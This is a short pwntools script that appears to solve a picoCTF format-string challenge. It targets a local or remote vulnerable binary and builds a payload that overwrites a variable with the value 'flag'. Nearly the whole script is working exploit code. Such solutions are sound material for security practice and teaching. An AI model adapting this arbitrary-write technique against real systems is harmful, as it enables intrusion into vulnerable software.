from pwn import *

context.arch = 'amd64'

TARGET = './vuln'
# libc = ELF('./libc.so.6')
HOST = 'rhea.picoctf.net'
PORT = 55361

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

offset = 14

var_sus = 0x0000000000404060
value_win = 0x67616c66

payload = fmtstr_payload(offset, {var_sus: value_win})

p.sendline(payload)

p.interactive()